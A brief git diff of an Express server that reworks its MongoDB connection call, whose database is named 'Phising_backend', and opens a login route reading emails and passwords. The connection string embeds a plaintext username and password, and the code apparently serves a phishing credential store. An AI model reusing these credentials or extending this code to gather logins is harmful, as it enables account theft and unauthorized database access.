@@ -16,13 +16,12 @@ app.use(cors({
     allowedHeaders: "Content-Type,Authorization"
 }));
 
-mongoose.connect("mongodb+srv://hatersnothing:hatersnothing@mycluser.7ontl.mongodb.net/Phising_backend").then((result) => {
-    console.log("result");
-    
-}).catch((err) => {
-    console.log(err,"error occuring");
-    
-});
+mongoose.connect("mongodb+srv://hatersnothing:hatersnothing@mycluser.7ontl.mongodb.net/Phising_backend", {
+    useNewUrlParser: true,
+    useUnifiedTopology: true
+})
+.then(() => console.log("MongoDB Connected Successfully"))
+.catch(err => console.error("MongoDB Connection Error:", err));
 app.options("*", cors()); 
 app.post("/api/login",async(req,res)=>{
     const {password,email}=req.body;
